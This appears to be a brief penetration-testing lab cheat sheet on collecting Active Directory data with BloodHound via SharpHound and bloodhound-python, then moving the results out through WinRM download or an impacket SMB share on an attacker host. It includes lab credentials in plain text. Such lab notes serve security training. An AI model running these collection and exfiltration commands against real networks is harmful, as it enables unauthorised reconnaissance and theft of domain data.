
Windows Collector
----
Upload SharpHound.ps1
```
upload SharpHound.ps1
```
- Use SharpHound at locate -i sharphound.ps1
- or [https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors](https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors)

```
Import-Module .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\r.andrews -OutputPrefix "collector"
```

Linux Collector
----
```
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

Then zip .json files
```
zip -r ilfreight_bh.zip *.json
```

Download the zip file to kali
---
WinRM
```
download me_20260207103546_BloodHound.zip
```
SMB Server
```
impacket-smbserver share . -smb2support -username 'htb-student' -password 'Academy_student_AD!'
```
```
copy 20260522045312_ILFREIGHT.zip \\10.10.14.29\share
```

BloodHound
---
Now we start Neo4j
```
sudo neo4j start
bloodhound-start
```

Run again after getting elevated privileges 
